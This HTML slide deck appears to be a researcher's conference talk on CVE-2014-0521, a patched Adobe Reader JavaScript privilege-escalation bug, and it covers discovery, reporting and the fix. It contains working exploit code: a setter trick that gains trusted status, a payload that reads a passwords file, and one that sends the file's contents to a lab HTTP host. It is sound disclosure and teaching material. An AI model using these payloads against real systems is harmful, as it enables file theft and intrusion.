<!doctype html>
<html lang="en">

	<head>
		<meta charset="utf-8">

		<title>The life of an Adobe Reader JavaScript bug</title>

		<meta name="description" content="A presentation on the CVE-2014-0521 Adobe Reader bug.">
		<meta name="author" content="Gábor Molnár">

		<meta name="apple-mobile-web-app-capable" content="yes" />
		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />

		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<link rel="stylesheet" href="css/reveal.min.css">
		<link rel="stylesheet" href="css/theme/solarized.css" id="theme">

		<!-- For syntax highlighting -->
		<link rel="stylesheet" href="lib/css/zenburn.css">

		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
		<script>
			if( window.location.search.match( /print-pdf/gi ) ) {
				var link = document.createElement( 'link' );
				link.rel = 'stylesheet';
				link.type = 'text/css';
				link.href = 'css/print/pdf.css';
				document.getElementsByTagName( 'head' )[0].appendChild( link );
			}
		</script>

		<!--[if lt IE 9]>
		<script src="lib/js/html5shiv.js"></script>
		<![endif]-->

        <style>
            .noborder {
                border: none !important;
                box-shadow: none !important;
            }
            .tt {
                font-family: "Consolas", "Courier New", Courier, mono, serif !important;
            }
        </style>
	</head>

	<body style="background-color: white">

		<div class="reveal">

			<!-- Any section element inside of this container is displayed as a slide -->
			<div class="slides">
				<section>
					<h1>The life of an Adobe Reader JavaScript bug</h1>
					<h3 style="margin-top: 1em;">Gábor Molnár / <a href="https://twitter.com/molnar_g">@molnar_g</a></h3>
				</section>

				<section>
					<h2>Me</h2>
                    <p><b>-2013</b> work at various companies, mainly JavaScript</p>
                    <p><b>2013-</b> work at <a href="http://ukatemi.com/">Ukatemi</a> (<a href="http://crysys.hu/">CrySyS</a> spin-off), malware related stuff</p>
                    <p><b>CTF competitions</b> with the <a href="https://ctftime.org/team/5347">!SpamAndHex</a> team</p>
                    <p>Participating in <b>bug bounty programs</b></p>
				</section>

                <section>
                    <h2>This talk - <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0521">CVE-2014-0521</a></h2>
                    <p>Fixed in Adobe Reader version <b>11.0.07</b> on <b>May 13, 2014</b></p>
                    <p><a href="http://helpx.adobe.com/security/products/reader/apsb14-15.html">Adobe Security Bulletin APSB14-15</a></p>
                    <p style="margin-top: 1em;">JS → Adobe Reader JS → discovery → exploit → reporting → fix</p>
                </section>

                <section>
                    <h2>A related talk by me</h2>
                    <p><a href="https://www.youtube.com/watch?v=znLBb1e3b3E">Ethical Hacking Conference 2014 Hungary </a></p>
                    <p>Hungarian, JS bugs in general,</p>
                    <p>Firefox and Adobe Reader example, no code release</p>
                    <a class="fragment" href="http://tanilu.tumblr.com/post/52612651076"><img src="img/cats.gif"></a>
                </section>

                <section>
                    <h2>JavaScript basics - functions</h2>
					<pre><code data-trim class="javascript">
function f1(a) {  // Function statement with name
    return a*2;
}

var f2 = function(a) {  // Function expression assigned to variable
    return a*100
};

var f3 = f1;  // Function references, first class functions

console.log(f1(1));  // 2
console.log(f2(2));  // 200
console.log(f3(3));  // 6
                    </code></pre>
                </section>

                <section>
                    <h2>JavaScript basics - objects, methods</h2>
					<pre><code data-trim class="javascript">
var o = {
    a: 1,
    b: [1,2,3,4]
};

o.a = 42;

o.f = function(p) {
    console.log('"this.a" is: ' + this.a + ', parameter is:' + p);
};

o.f(1);  // "this.a" is 42, parameter is 1
                    </code></pre>
                    <div class="fragment">
                        <span class="tt">this</span> is just a hidden parameter:
					    <pre><code data-trim class="javascript">
o.f.call({ a: 0 }, 2);  // "this.a" is 0, parameter is 2
                        </code></pre>
                    </div>
                </section>

                <section>
                    <h2>JavaScript basics - properties</h2>
					<pre><code data-trim class="javascript">
var o = { a: 1 };
o.__defineGetter__('b', function() {       // Non-standard only API
    return this.a * 2;
});
o.__defineSetter__('b', function(value) {  // Non-standard only API
    this.a = value / 2;
});

console.log(o.a, o.b);  // 1, 2
o.a = 10;
console.log(o.a, o.b);  // 10, 20
o.b = 1000;
console.log(o.a, o.b);  // 500, 1000
                    </code></pre>
                </section>

                <section>
                    <h2>Adobe Reader = good PDF reader</h2>
                    <img src="img/adobe-reader-logo.png" class="noborder" style="height: 5em">
                    <span class="fragment">
                        <img src="img/plus.png" class="noborder" style="height: 5em">
                        <img src="img/good-idea.jpeg" class="noborder" style="height: 5em; padding-bottom: 0.5em;">
                    </span>
                </section>

                <section>
                    <h2>Adobe Reader + JS = <span style="color: green">great</span> PDF reader</h2>
                    <img src="img/adobe-reader-logo.png" class="noborder" style="height: 5em">
                    <img src="img/plus.png" class="noborder" style="height: 5em">
                    <img src="img/js-logo.png" class="noborder" style="height: 5em">
                </section>

                <section>
                    <h2>Architecture</h2>
                    <img src="img/architecture.png" class="noborder">
                </section>

                <section>
                    <h2>Privileged and Trusted</h2>
                    <p>Utility scripts, JS API implementations, signed PDFs need:</p>
                    <p><b style="color: blue">File IO, HTTP (form submission), etc.</b></p>
                    <p class="fragment"><b style="color: blue">Privileged API</b>: only <b style="color: green">Trusted functions</b> can call it.</p>
                    <img src="img/chain-of-trust.png" class="fragment noborder" style="margin-top: 1em; height: 10em;">
                </section>

                <section>
                    <h2>Gaining Trusted status, example</h2>
                    <p>Init script:</p>
					<pre><code data-trim class="javascript">
app.apiFunction = app.trustedFunction(function(cb_object, cb_name, param) {
    app.beginPriv();
    // Do privileged stuff
    cb_object[cb_name](param);
    app.endPriv();
});
                    </code></pre>
                    <div class="fragment">
                        Exploit PDF:
					    <pre><code data-trim class="javascript">
function f() {
    app.beginPriv();
    // Do privileged operations
    app.endPriv();
}

app.apiFunction(app, 'trustedFunction', f);
f();
                        </code></pre>
                    </div>
                </section>

                <section>
                    <h2>Let's review the init code!</h2>
                    <p>Stored in a binary file: <b>JSByteCodeWin.bin</b></p>
                    <pre><code data-trim class="xml">
$ file JSByteCodeWin.bin
JSByteCodeWin.bin: data
                    </code></pre>
                    <pre class="fragment"><code data-trim class="xml">
$ od -t x1 JSByteCodeWin.bin | head -n 1
0000000    07  00  ad  de  ff  1f  00  00  57  00  00  00  b4  00  00  00
                    </code></pre>
                    <pre class="fragment"><code data-trim class="xml">
$ od -t x4 JSByteCodeWin.bin | head -n 1
0000000    dead0007  00001fff  00000057  000000b4
                    </code></pre>
                    <pre class="fragment"><code data-trim class="xml¡">
$ strings EScript.api | grep JavaScript # Adobe Reader Linux version 9.5.5
...
JavaScript-C 1.8.0 pre-release 1 2009-02-16
...
                    </code></pre>
                    <p class="fragment"><b><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/1.8">SpiderMonkey 1.8</a> <a href="http://en.wikipedia.org/wiki/External_Data_Representation">XDR bytecode</a></b> format! (Firefox 3.0)</p>
                </section>

                <section>
                    <h2>Decompiling the bytecode</h2>
                    <p>Need to build SpiderMonkey 1.8 - painful!</p>
                    <p>I've published the tool (source and binary) on GitHub:<p>
                    <p><a href="https://github.com/molnarg/dead0007">molnarg/dead0007</a></p>
                    <p style="margin-top: 1em; font-weight: bold" class="fragment">> 22000 lines of JavaScript (prettified)!</p>
                </section>

                <section>
                    <h2>JS console</h2>

                    <p>Save this in <span class="tt">Reader 11.0/Reader/Javascripts</span> as <span class="tt">.js</span></p>
                    <pre><code data-trim class="javascript">
app.addMenuItem({
    cName:"Console Window", cParent:"View", cExec:"console.show()"
});
                    </code></pre>

                    <img style="height: 9em;" class="noborder" src="img/reader-js-console.png">
                </section>

                <section>
                    <h2>Hunting bugs!</h2>
                    <pre><code data-trim class="javascript">
DynamicAnnotStore = app.trustedFunction(function (doc, user, settings) {
    this.doc = doc;
    this.user = user;
    // ...
});
var store = new DynamicAnnotStore(doc, { name: 'MG', ... }, { ... });
                    </code></pre>
                    <p>How to make this call a function for us?</p>
                </section>

                <section>
                    <h2>Property trick</h2>
                    <pre><code data-trim class="javascript">
app.__defineSetter__('doc', app.beginPriv);
app.__defineSetter__('user', app.trustedFunction);

DynamicAnnotStore.call(/*this=*/app, /*doc=*/null, /*user=*/f);
                    </code></pre>
                    <div class="fragment">
                        <p>Original code, and what actually happens:</p>
                        <pre><code data-trim class="javascript">
this.doc = doc   -> app.beginPriv(null)
this.user = user -> app.trustedFunction(f)
                        </code></pre>
                    </div>
                    <p class="fragment"><b>Problem</b>: cannot override property <span class="tt">doc</span> on the <span class="tt">app</span> object!</p>
                </section>
                <section>
                    <h2>Property trick v2</h2>
                    <pre><code data-trim class="javascript">
var t = {};
t.__defineSetter__('doc', app.beginPriv);
t.__defineSetter__('user', app.trustedFunction);
t.__proto__ = app;
DynamicAnnotStore.call(/*this=*/t, /*doc=*/null, /*user=*/f);
                    </code></pre>
                    <div class="fragment">
                        <p>Original code, and what actually happens:</p>
                        <pre><code data-trim class="javascript">
this.doc = doc   -> app.beginPriv.call(t, null)
this.user = user -> app.trustedFunction.call(t, f)
                        </code></pre>
                    </div>
                    <p class="fragment"><b>Works!</b></p>
                </section>

                <section>
                    <h2>Payload</h2>
                    <p>Print file contents (<a href="http://molnarg.github.io/cve-2014-0521/cve-2014-0521-poc-1.pdf">cve-2014-0521-poc-1.pdf</a>):</p>
                    <pre><code data-trim class="javascript">
function f() {
    app.beginPriv();
    var file = '/c/notes/passwords.txt';
    var secret = util.stringFromStream(util.readFileIntoStream(file, false));
    app.alert(secret);
    app.endPriv();
}
                    </code></pre>
                    <p>Send file contents over HTTP (<a href="http://molnarg.github.io/cve-2014-0521/cve-2014-0521-poc-2.pdf">cve-2014-0521-poc-2.pdf</a>):</p>
                    <pre><code data-trim class="javascript">
function f() {
    app.beginPriv();
    var file = '/c/notes/passwords.txt';
    var secret = util.stringFromStream(util.readFileIntoStream(file, true));
    var url = 'http://192.168.56.1:9999/' + Math.ceil(Math.random()*10000) + '__________' + secret;
    Collab.uriCreateFolder(url);
    app.endPriv();
}
                    </code></pre>
                </section>

                <section>
                    <h1>DEMO</h1>
                </section>

                <section>
                    <h2>Reporting the bug</h2>
                    <p>We've reported the bug on March 10, 2014,</p>
                    <p>got almost immediate response. (Thanks <a href="https://twitter.com/boldi">@boldi</a>!)</p>
                </section>

                <section>
                    <h2>The fix</h2>
                    <p>The fix was released on May 13, 2014.</p>
                    <p><b>Probably:</b> forbid calling <span class="tt">app.trustedFunction()</span> from property getter/setter.</p>
                    <p><b>TODO:</b> reverse engineer the patch.</p>
                </section>

                <section>
                    <h2>Tips for JS hacking</h2>
                    <div class="fragment">
                        <p>Property accesses are function calls.
                    </div>
                    <div class="fragment">
                        <p>Lot of checks can be bypassed:</p>
                        <pre><code data-trim class="javascript">
if (a == 'x' && a == 'y' && a == 'z') { // ...
                        </code></pre>
                    </div>
                    <div class="fragment">
                        <p>Time of check to time of use (TOCTTOU):</p>
                        <pre><code data-trim class="javascript">
if (a.x === 'console.log("Hello World");') eval(a.x);
                        </code></pre>
                    </div>
                    <div class="fragment">
                        <p>Built-in objects, classes are modifiable:</p>
                        <pre><code data-trim class="javascript">
Math.random = function() { return 1; };
RegExp.prototype.test = function() { return true; };
                        </code></pre>
                    </div>
                    <p class="fragment">JavaScript Proxies are very powerful (not usable in Reader).</p>
                </section>

                <section>
                    <h2>Bonus tip</h2>
                    <p>1. Find a JS privilege escalation bug like this one.</p>
                    <p>2. Find bugs in privileged functions by fuzzing.</p>
                    <p style="margin-top: 1em;">Probably easier than finding bugs in unprivileged functions that have been fuzzed for a long time now.</p>
                </section>

                <section>
                    <h1>THE END</h1>
                    <h2>Questions?</h2>
                </section>
			</div>

		</div>

		<script src="lib/js/head.min.js"></script>
		<script src="js/reveal.min.js"></script>

		<script>

			// Full list of configuration options available here:
			// https://github.com/hakimel/reveal.js#configuration
			Reveal.initialize({
				controls: true,
				progress: true,
				history: true,
				center: true,

				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
				transition: 'linear', // default/cube/page/concave/zoom/linear/fade/none

				// Parallax scrolling
				// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
				// parallaxBackgroundSize: '2100px 900px',

				// Optional libraries used to extend on reveal.js
				dependencies: [
					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
				]
			});

		</script>

	</body>
</html>
